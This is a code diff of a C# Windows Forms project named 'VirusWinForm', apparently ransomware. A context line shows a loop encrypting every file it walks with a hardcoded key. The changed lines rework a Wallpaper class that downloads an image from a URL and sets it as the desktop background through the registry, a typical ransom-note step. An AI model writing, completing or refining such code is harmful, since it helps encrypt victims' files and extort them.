@@ -9,6 +9,8 @@ using Microsoft.Win32;
 using System.Threading.Tasks;
 using System.Net;
 using System.Drawing;
+using System.ServiceProcess;
+
 //Use this for Encryp or Decryp file
 namespace VirusWinForm
 {
@@ -132,6 +134,7 @@ namespace VirusWinForm
                 FileInfo mFileInfo = new FileInfo(cnt);
                 if (mFileInfo.Attributes != FileAttributes.Directory)
                 {
+
                     Console.WriteLine(cnt);
                     Crypto.Encrypt.EncryptFile(cnt, "tuduyconheo20190");
 
@@ -155,11 +158,12 @@ namespace VirusWinForm
         }
     }
 
-
-
-    public  class Wallpaper
+    public class Wallpaper
     {
-        static Wallpaper() { }
+        public Wallpaper()
+        {
+
+        }
 
         const int SPI_SETDESKWALLPAPER = 20;
         const int SPIF_UPDATEINIFILE = 0x01;
@@ -170,54 +174,35 @@ namespace VirusWinForm
 
         public enum Style : int
         {
-            Tile,
-            Center,
-            Stretch,
-            Fill,
-            Fit,
-            Span
+            Tiled,
+            Centered,
+            Stretched
         }
 
-        public  void Set(Uri uri, Style style)
+        public void Set(Uri uri, Style style)
         {
             System.IO.Stream s = new System.Net.WebClient().OpenRead(uri.ToString());
-
             System.Drawing.Image img = System.Drawing.Image.FromStream(s);
-            string tempPath = Path.Combine(Path.GetTempPath(), "close.png");
-            img.Save(tempPath, System.Drawing.Imaging.ImageFormat.Png);
+            string tempPath = Path.Combine(Path.GetTempPath(), "phupng.jpg");
+            img.Save(tempPath, System.Drawing.Imaging.ImageFormat.Jpeg);
 
             RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
-
-            if (style == Style.Fill)
-            {
-                key.SetValue(@"WallpaperStyle", 10.ToString());
-                key.SetValue(@"TileWallpaper", 0.ToString());
-            }
-            if (style == Style.Fit)
-            {
-                key.SetValue(@"WallpaperStyle", 6.ToString());
-                key.SetValue(@"TileWallpaper", 0.ToString());
-            }
-
-            if (style == Style.Span) // Windows 8 or newer only!
-            {
-                key.SetValue(@"WallpaperStyle", 22.ToString());
-                key.SetValue(@"TileWallpaper", 0.ToString());
-            }
-            if (style == Style.Stretch)
+            if (style == Style.Stretched)
             {
                 key.SetValue(@"WallpaperStyle", 2.ToString());
                 key.SetValue(@"TileWallpaper", 0.ToString());
             }
-            if (style == Style.Tile)
+
+            if (style == Style.Centered)
             {
-                key.SetValue(@"WallpaperStyle", 0.ToString());
-                key.SetValue(@"TileWallpaper", 1.ToString());
-            }
-            if (style == Style.Center)
-            {
-                key.SetValue(@"WallpaperStyle", 0.ToString());
+                key.SetValue(@"WallpaperStyle", 1.ToString());
                 key.SetValue(@"TileWallpaper", 0.ToString());
+            }
+
+            if (style == Style.Tiled)
+            {
+                key.SetValue(@"WallpaperStyle", 1.ToString());
+                key.SetValue(@"TileWallpaper", 1.ToString());
             }
 
             SystemParametersInfo(SPI_SETDESKWALLPAPER,
@@ -225,7 +210,10 @@ namespace VirusWinForm
                 tempPath,
                 SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
         }
+
     }
+
+
 }
 
 
